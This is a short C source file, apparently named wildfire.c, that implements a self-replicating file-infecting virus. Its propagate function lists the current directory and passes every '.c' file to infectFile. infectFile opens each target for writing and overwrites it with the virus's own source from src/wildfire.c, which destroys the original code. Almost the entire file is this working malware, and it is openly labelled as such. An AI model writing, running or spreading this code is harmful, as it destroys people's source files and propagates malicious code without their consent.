#include <stdio.h>

#include "dirent.h"
#include "wildfire.h"

void propagate()
{
    DIR *d;
    struct dirent *dir;
    d = opendir(".");
    
    if (d)
    {
        while ((dir = readdir(d)) != 0)
        {
            //printf("%s\n", fileName);
            const char *fileName = dir->d_name;
            const char *fileNameExtension = getFileNameExtension(fileName);
            if ((strcmp(fileNameExtension, "c") == 0))
            {
                //printf(fileName);
                infectFile(fileName);
            }
        }
        closedir(d);
    }
}

const char *getFileNameExtension(const char *fileName)
{
    const char *dot = strrchr(fileName, '.');
    if (!dot || dot == fileName)
    {
        return "";
    }
    return dot + 1;
}

void infectFile(const char *fileName)
{
    FILE *virus = fopen("src/wildfire.c", "r");
    FILE *target = fopen(fileName, "w");
    char ch;

    while ((ch = getc(virus)) != EOF)
    {
        putc(ch, target);
    }

    fclose(virus);
    fclose(target);
}